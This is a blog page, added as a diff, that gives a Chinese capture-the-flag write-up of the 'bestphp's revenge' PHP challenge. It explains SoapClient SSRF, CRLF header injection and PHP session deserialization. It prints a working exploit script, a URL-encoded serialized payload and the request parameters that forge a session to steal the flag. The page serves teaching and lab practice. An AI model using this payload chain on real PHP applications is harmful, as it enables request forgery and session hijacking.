@@ -1,0 +1,398 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="odiws">
+
+
+
+
+
+<title>bestphp&#39;srevenge | Hexo</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Bentham&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Bentham&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">bestphp&#39;srevenge</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">odiws</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">August 19, 2024&nbsp;&nbsp;10:22:38</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/">刷题笔记</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h2 id="bestphp’s-revenge"><a href="#bestphp’s-revenge" class="headerlink" title="bestphp’s revenge"></a>bestphp’s revenge</h2><h3 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$b = &#x27;implode&#x27;;</span><br><span class="line">call_user_func($_GET[&#x27;f&#x27;], $_POST);</span><br><span class="line">session_start();</span><br><span class="line">if (isset($_GET[&#x27;name&#x27;])) &#123;</span><br><span class="line">    $_SESSION[&#x27;name&#x27;] = $_GET[&#x27;name&#x27;];</span><br><span class="line">&#125;</span><br><span class="line">var_dump($_SESSION);</span><br><span class="line">$a = array(reset($_SESSION), &#x27;welcome_to_the_lctf2018&#x27;);</span><br><span class="line">call_user_func($b, $a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="flag-php"><a href="#flag-php" class="headerlink" title="#flag.php"></a>#flag.php</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">session_start();</span><br><span class="line">echo &#x27;only localhost can get flag!&#x27;;</span><br><span class="line">$flag = &#x27;LCTF&#123;*************************&#125;&#x27;;</span><br><span class="line">if($_SERVER[&quot;REMOTE_ADDR&quot;]===&quot;127.0.0.1&quot;)&#123;</span><br><span class="line">       $_SESSION[&#x27;flag&#x27;] = $flag;</span><br><span class="line">   &#125;</span><br><span class="line">only localhost can get flag!</span><br></pre></td></tr></table></figure>
+
+<h3 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h3><h4 id="1-Session在写入和读取时。都会进行序列化-反序列化"><a href="#1-Session在写入和读取时。都会进行序列化-反序列化" class="headerlink" title="1.Session在写入和读取时。都会进行序列化&#x2F;反序列化"></a>1.Session在写入和读取时。都会进行序列化&#x2F;反序列化</h4><h4 id="2-利用soap进行SSRF"><a href="#2-利用soap进行SSRF" class="headerlink" title="2.利用soap进行SSRF"></a>2.利用soap进行SSRF</h4><h4 id="3-call-user-func的调用"><a href="#3-call-user-func的调用" class="headerlink" title="3.call_user_func的调用"></a>3.call_user_func的调用</h4><h3 id="一-SoapClient"><a href="#一-SoapClient" class="headerlink" title="一. SoapClient"></a>一. SoapClient</h3><p><strong>SOAP是webService三要素（SOAP、WSDL(WebServicesDescriptionLanguage)、UDDI(UniversalDescriptionDiscovery andIntegration)）之一：WSDL 用来描述如何访问具体的接口， UDDI用来管理，分发，查询webService ，SOAP（简单对象访问协议）是连接或Web服务或客户端和Web服务之间的接口。其采用HTTP作为底层通讯协议，XML作为数据传送的格式。</strong><br><strong>SoapClient类可以创建soap数据报文，与wsdl接口进行交互。</strong></p>
+<p><img src="/../images/bestphp'srevenge/1.jpg" alt="1"></p>
+<p>第一个参数的意思是：控制是否是wsdl模式，如果为NULL，就是非wsdl模式.如果是非wsdl模式，反序列化的时候就会对options中的url进行远程soap请求，第二个参数的意思是：一个数组，里面是soap请求的一些参数和属性。</p>
+<p><strong>简单的用法</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(location<span class="string">&#x27;=&gt;&#x27;</span>http:<span class="comment">//example.com:2333&#x27;,&#x27;uri&#x27;=&gt;&#x27;123&#x27;));</span></span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$c</span>-&gt;<span class="title function_ invoke__">a</span>();</span><br></pre></td></tr></table></figure>
+
+<p>可以利用 <strong>SoapClient</strong> 类的 <strong>__call</strong> （当调用对象中不存在的方法会自动调用此方法）方法来进行 <strong>SSRF</strong></p>
+<p><img src="/../images/bestphp'srevenge/2.jpg" alt="2"></p>
+<h3 id="二-CRLF-Injection漏洞"><a href="#二-CRLF-Injection漏洞" class="headerlink" title="二. CRLF Injection漏洞"></a>二. CRLF Injection漏洞</h3><p><strong>首先要对HTTPheaders 和 HTTPbody 要有一些基本的了解，如图，它们之前用空行区分</strong></p>
+<p><img src="/../images/bestphp'srevenge/3.png" alt="3"></p>
+<p><strong>CRLF是”回车+换行”（\r\n）的简称。在HTTP协议中，HTTPHeader与HTTPBody是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP内容并显示出来。所以，一旦我们能够控制HTTP消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLFInjection又叫HTTPResponseSplitting，简称HRS。</strong><br><strong>简单来说</strong><br><strong>http请求遇到两个\r\n即%0d%0a，会将前半部分当做头部解析，而将剩下的部分当做体，当我们可以控制User-Agent的值时，头部可控，就可以注入crlf实现修改http请求包。</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&quot;http://localhost:2333&quot;</span>;</span><br><span class="line"><span class="variable">$options</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&quot;location&quot;</span> =&gt; <span class="variable">$target</span>,</span><br><span class="line">    <span class="string">&quot;user_agent&quot;</span> =&gt; <span class="string">&quot;mochazz\r\nCookie: PHPSESSID=123123\r\n&quot;</span>,</span><br><span class="line">    <span class="string">&quot;uri&quot;</span> =&gt; <span class="string">&quot;demo&quot;</span></span><br><span class="line">);</span><br><span class="line"><span class="variable">$attack</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="variable">$options</span>);</span><br><span class="line"><span class="variable">$payload</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$attack</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$payload</span>)-&gt;<span class="title function_ invoke__">ff</span>(); <span class="comment">// 调用一个不存在的ff方法，会触发__call方法，发出HTTP请求</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>得到如下</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">→/home nc - lvp 2333</span><br><span class="line">listening on [any] 2333</span><br><span class="line">connect to [127.0.0.1] from localhost [127.0.0.1] 42022</span><br><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost :2333</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>Keep-Alive</span><br><span class="line">User -Agent: mochazz</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID= 123123    </span><br><span class="line"></span><br><span class="line"><span class="language-ruby"><span class="title class_">Content</span>-<span class="title class_">Type</span>: text/xml; charset=utf-<span class="number">8</span></span></span><br><span class="line"><span class="language-ruby"><span class="title class_">SOAPAction</span>: <span class="string">&quot;demo#a&quot;</span></span></span><br><span class="line"><span class="language-ruby"><span class="title class_">Content</span>-<span class="title class_">Length</span>: <span class="number">365</span></span></span><br><span class="line"><span class="language-ruby"></span></span><br><span class="line"><span class="language-ruby">&lt;<span class="string">?x</span>ml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span><span class="string">?&gt;</span> </span></span><br><span class="line"><span class="language-ruby">&lt;<span class="variable constant_">S0AP</span>- <span class="variable constant_">ENV</span><span class="symbol">:Envelope</span> <span class="symbol">xmlns:</span> <span class="variable constant_">S0AP</span>- <span class="variable constant_">ENV</span>= <span class="string">&quot;http:/ /schemas . xmlsoap . org/ soap/envelope/&quot;</span> <span class="symbol">xmlns:</span>ns1=<span class="string">&quot;demo&quot;</span> xmIns <span class="symbol">:xsd=<span class="string">&quot;http:/ /www .w3.org/</span></span></span></span><br><span class="line"><span class="string"><span class="symbol"><span class="language-ruby">2001/XMLSchema&quot;</span></span> xmIns : <span class="variable constant_">SOAP</span> -<span class="variable constant_">ENC</span>=<span class="string">&quot;http://schemas .xmlsoap .or g/soap/ encoding/&quot;</span> <span class="variable constant_">SOAP</span>- <span class="variable constant_">ENV</span><span class="symbol">:encodingStyle=<span class="string">&quot;http://schemas .xmlsoap.og/ soap/ encoding/&quot;</span>&gt;&lt;S0AP</span> - <span class="variable constant_">ENV</span> : <span class="title class_">Body</span>&gt;&lt;ns1 <span class="symbol">:a/&gt;&lt;/S0AP</span> - <span class="variable constant_">ENV</span>: <span class="title class_">Body</span>&gt;&lt;<span class="regexp">/S0AP ENV: Envelope&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<h2 id="三-call-user-func"><a href="#三-call-user-func" class="headerlink" title="三. call_user_func"></a>三. call_user_func</h2><p><strong>call_user_func函数中的参数可以是一个数组，数组中第一个元素为类名，第二个元素为类方法。</strong></p>
+<p>先传入extract()，将$b覆盖成回调函数，这样题目中的 <strong>call_user_func($b,$a)</strong> 就可以变成 <strong>call_user_func(‘call_user_func’,array(‘SoapClient’,’welcome_to_the_lctf2018’))</strong> ，即调用 <strong>SoapClient</strong> 类不存在的 <strong>welcome_to_the_lctf2018</strong> 方法，从而触发 <strong>__call</strong> 方法发起 <strong>soap</strong> 请求进行 <strong>SSRF</strong> 。</p>
+<h2 id="四-PHPsession-反序列化"><a href="#四-PHPsession-反序列化" class="headerlink" title="四. PHPsession 反序列化"></a>四. PHPsession 反序列化</h2><table>
+<thead>
+<tr>
+<th align="left">Directive</th>
+<th align="left">含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">session.save_handler</td>
+<td align="left">session保存形式。默认为files</td>
+</tr>
+<tr>
+<td align="left">session.save_path</td>
+<td align="left">session保存路径。</td>
+</tr>
+<tr>
+<td align="left">session.serialize_handler</td>
+<td align="left">session序列化存储所用处理器。默认为php。</td>
+</tr>
+<tr>
+<td align="left">session.upload_progress.cleanup</td>
+<td align="left">一旦读取了所有POST数据，立即清除进度信息。默认开启</td>
+</tr>
+<tr>
+<td align="left">session.upload_progress.enabled</td>
+<td align="left">将上传文件的进度信息存在session中。默认开启。</td>
+</tr>
+</tbody></table>
+<p>我们先通过一个样例代码，看看3种不同的 <strong>session</strong> 序列化处理器处理 <strong>session</strong> 的情况。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;mochazz&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>当 <strong>session.serialize_handler&#x3D;php</strong> 时，session文件内容为： <code>name|s:7:&quot;mochazz&quot;;</code></p>
+<p>当 <strong>session.serialize_handler&#x3D;php_serialize</strong> 时，session文件为： <code>a:1:&#123;s:4:&quot;name&quot;;s:7:&quot;mochazz&quot;;&#125;</code></p>
+<p>当 <strong>session.serialize_handler&#x3D;php_binary</strong> 时，session文件内容为： <code>二进制字符names:7:&quot;mochazz&quot;;</code></p>
+<p><strong>而当session反序列化和序列化时候使用不同引擎的时候，即可触发漏洞</strong></p>
+<p><strong>php引擎会以|作为作为key和value的分隔符，我们在传入内容的时候，比如传入</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[‘name’] = ‘|username‘</span><br></pre></td></tr></table></figure>
+
+<p><strong>那么使用php_serialize引擎时可以得到序列化内容</strong></p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">a</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:”name”;s:<span class="number">4</span>:”|username”;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>然后用php引擎反序列化时，|被当做分隔符，于是</strong></p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">a</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:”name”;s:<span class="number">4</span>:”</span><br></pre></td></tr></table></figure>
+
+<p><strong>被当作key</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username</span><br></pre></td></tr></table></figure>
+
+<p><strong>被当做vaule进行反序列化</strong></p>
+<p><strong>于是，我们只要传入</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[‘name’] = |序列化内容</span><br></pre></td></tr></table></figure>
+
+<p><strong>即可触发漏洞</strong></p>
+<hr>
+<p>知识点就讲到这里，接下去来分析一下题目</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&#x27;implode&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>], <span class="variable">$_POST</span>);  <span class="comment">//参数二的位置固定为 $_POST 数组，我们很容易便想到利用 extract 函数进行变量覆盖，以便配合后续利用</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">&#125;   <span class="comment">//存在 session 伪造漏洞，我们可以考虑是否可以包含 session 文件或者利用 session 反序列化漏洞</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">array</span>(<span class="title function_ invoke__">reset</span>(<span class="variable">$_SESSION</span>), <span class="string">&#x27;welcome_to_the_lctf2018&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$b</span>, <span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="keyword">array</span>(<span class="number">0</span>) &#123; &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//flag.php  (扫目录扫到的)</span></span><br><span class="line">only localhost can get flag!<span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;only localhost can get flag!&#x27;</span>;</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;LCTF&#123;*************************&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]===<span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">       <span class="variable">$_SESSION</span>[<span class="string">&#x27;flag&#x27;</span>] = <span class="variable">$flag</span>;</span><br><span class="line">   &#125;</span><br><span class="line">only localhost can get flag!</span><br></pre></td></tr></table></figure>
+
+<p>分析下代码，flag.php 文件中告诉我们，只有 127.0.0.1 请求该页面才能得到 flag ，所以这明显又是考察 SSRF 漏洞，这里我们便可以利用 SoapClient 类的 __call 方法来进行 SSRF</p>
+<p>第一步：由于 PHP 中的原生 SoapClient 类存在 CRLF 漏洞，所以我们可以伪造任意 header ，构造 <strong>SoapClient</strong> 类，并用php_serialize引擎进行序列化，存入session</p>
+<blockquote>
+<p><strong>PHP 7 中 session_start () 函数可以接收一个数组作为参数，可以覆盖 php.ini 中 session 的配置项。这个特性也引入了一个新的 php.ini 设置（session.lazy_write）</strong></p>
+</blockquote>
+<p>我们可以利用回调函数，通过给f传参，值为session_start，然后post提交 <code>array(&#39;serialize_handler&#39;=&gt;&#39;php_serialize&#39;)</code></p>
+<p>即达到<strong>session_start(array(‘serialize_handler’ &#x3D;&gt; ‘php_serialize’))</strong> ，将会根据php7特性设置session.serialize_handler&#x3D;php_serialize。而又因为session是可控的，可以通过传入name值，任意伪造。这里就想到name传入的是序列化值了，序列化exp</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span>=<span class="string">&#x27;http://127.0.0.1/flag.php&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,</span><br><span class="line">    <span class="string">&#x27;user_agent&#x27;</span> =&gt; <span class="string">&quot;npfs\r\nCookie:PHPSESSID=123456\r\n&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&quot;http://127.0.0.1/&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$se</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;|&quot;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$se</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//注意下，这个脚本想要执行，需要将php.ini里的 php_soap.dll 前面的分号去掉</span></span><br></pre></td></tr></table></figure>
+
+<p>执行脚本得到</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|O%3A1<span class="number">0</span>%<span class="number">3</span>A%22SoapClient%22%3A4%<span class="number">3</span>A%<span class="number">7</span>Bs%3A3%<span class="number">3</span>A%22uri%22%<span class="number">3</span>Bs%3A17%<span class="number">3</span>A%22http%<span class="number">3</span>A%<span class="number">2</span>F%2F127.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>%<span class="number">2</span>F%22%<span class="number">3</span>Bs%3A8%<span class="number">3</span>A%22location%22%<span class="number">3</span>Bs%3A25%<span class="number">3</span>A%22http%<span class="number">3</span>A%<span class="number">2</span>F%2F127.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>%2Fflag.php%22%<span class="number">3</span>Bs%3A11%<span class="number">3</span>A%22_user_agent%22%<span class="number">3</span>Bs%3A31%<span class="number">3</span>A%22npfs%0D%0ACookie%<span class="number">3</span>APHPSESSID%3D123456%0D%0A%22%<span class="number">3</span>Bs%3A13%<span class="number">3</span>A%22_soap_version%22%<span class="number">3</span>Bi%3A1%<span class="number">3</span>B%7D</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/bestphp'srevenge/4.jpg" alt="4"></p>
+<p>第二步：通过变量覆盖，调用SoapClient类，从而触发__call 方法</p>
+<p>传值f&#x3D;extract&amp;name&#x3D;SoapClient POST:b&#x3D;call_user_func. 这样 call_user_func($b,$a)就变成call_user_func(‘call_user_func’,array(‘SoapClient’,’welcome_to_the_lctf2018’)) ，即调用 SoapClient 类不存在的 welcome_to_the_lctf2018 方法，从而触发 __call 方法发起 soap 请求进行 SSRF 。</p>
+<p><img src="/../images/bestphp'srevenge/5.jpg" alt="5"></p>
+<p>第三步：将PHPSESSID改为我们在SoapClient类里设置的123456即可得到flag</p>
+<p><img src="/../images/bestphp'srevenge/6.jpg" alt="6"></p>
+<p>总的流程如下，图来源于网络<a target="_blank" rel="noopener" href="https://mochazz.github.io/2019/01/29/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E4%B9%8Bsession%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#%E4%BE%8B%E9%A2%98%E4%BA%8C">PHP反序列化入门之session反序列化</a><img src="/../images/bestphp'srevenge/7.png" alt="7"></p>
+<p>参考链接：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/NPFS/p/14335370.html">https://www.cnblogs.com/NPFS/p/14335370.html</a></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>odiws</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://odiws.github.io/2024/08/19/bestphp-srevenge/">http://odiws.github.io/2024/08/19/bestphp-srevenge/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/buuctf/"># buuctf</a>
+                    
+                        <a href="/tags/CRLF-Injection/"># CRLF Injection</a>
+                    
+                        <a href="/tags/soap/"># soap</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2024/08/21/GXYCTF2019-BabysqliV3-0/">[GXYCTF2019]BabysqliV3.0</a>
+            
+            
+            <a class="next" rel="next" href="/2024/08/17/RootersCTF2019-babyWeb/">[RootersCTF2019]babyWeb</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© odiws | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
